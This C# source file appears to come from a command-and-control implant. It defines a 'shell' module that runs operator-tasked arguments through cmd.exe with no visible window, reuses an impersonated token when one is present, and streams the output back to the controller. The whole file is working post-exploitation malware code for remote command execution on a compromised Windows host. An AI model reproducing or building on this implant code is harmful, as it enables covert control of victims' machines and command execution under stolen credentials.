using Agent.Helpers;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WinAPI;
using WinAPI.Wrapper;

namespace Agent.Commands
{
    public class ShellCommand : AgentCommand
    {
        public override string Name => "shell";
        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            //cmd.exe /c <command>
            var cmd = $@"c:\windows\system32\cmd.exe /c {task.Arguments}";

            var creationParms = new ProcessCreationParameters()
            {
                Command = cmd,
                RedirectOutput = true,
                CreateNoWindow = true,
                CurrentDirectory = Environment.CurrentDirectory
            };

            if (ImpersonationHelper.HasCurrentImpersonation)
                creationParms.Token = ImpersonationHelper.ImpersonatedToken;

            var procResult = APIWrapper.CreateProcess(creationParms);

            if (procResult.ProcessId == 0)
            {
                context.Error("Process start failed!");
                return;
            }

            if (creationParms.RedirectOutput)
                APIWrapper.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => context.AppendResult(output, false));
        }
    }
}
